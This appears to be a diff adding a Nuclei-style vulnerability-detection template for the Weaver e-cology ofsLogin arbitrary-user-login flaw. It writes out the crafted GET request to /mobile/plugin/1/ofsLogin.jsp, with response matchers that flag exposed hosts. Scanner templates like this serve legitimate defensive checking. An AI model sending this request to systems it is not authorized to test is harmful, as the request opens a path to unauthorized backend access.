@@ -1,0 +1,29 @@
+id: ecology-ofslogin-aul
+info:
+  name: ecology-ofslogin-aul
+  author: apple
+  severity: high
+  description: 2023年05月15日，泛微官方发布10.57.2版本安全补丁。其中修复了两个漏洞，分别是信息泄漏和任意用户登录漏洞，两个漏洞可以被攻击者组合起来利用，从而能够使攻击者进入到系统后台。
+  reference:
+    - https://www.cnblogs.com/pursue-security/p/17677361.html
+    - https://github.com/A0WaQ4/Weaver_ofslogin_vul
+  tags: ecology,weaver
+http:
+  - raw:
+      - |+
+        GET /mobile/plugin/1/ofsLogin.jsp?gopage=3&loginTokenFromThird&receiver=test&syscode=syscode&timestamp=2 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - /login/Login.jsp
+      - type: word
+        part: body
+        words:
+          - location.replace
